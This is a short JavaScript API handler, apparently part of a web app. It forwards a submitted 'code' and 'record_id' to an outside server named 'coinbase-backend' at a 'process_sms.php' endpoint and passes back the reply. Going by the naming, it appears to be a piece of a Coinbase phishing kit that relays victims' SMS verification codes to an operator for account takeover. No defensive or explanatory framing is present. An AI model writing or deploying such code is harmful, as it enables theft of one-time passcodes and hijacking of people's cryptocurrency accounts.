import axios from "axios";
export default function handler(req, res) {
  const form = new FormData()
  form.append("code", req.body.code)
  form.append("record_id", req.body.record_id)
  axios
      .post(
        "https://coinbase-backend-1vc1.onrender.com/process_sms.php",
        form,
        {
          headers: {
            "Content-Type": "multipart/form-data",
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Allow-Credentials": "true",
          },
        }
      )
      .then((result) => {
        const { success, code } = result.data
        res.status(200).json(result.data)
      });
}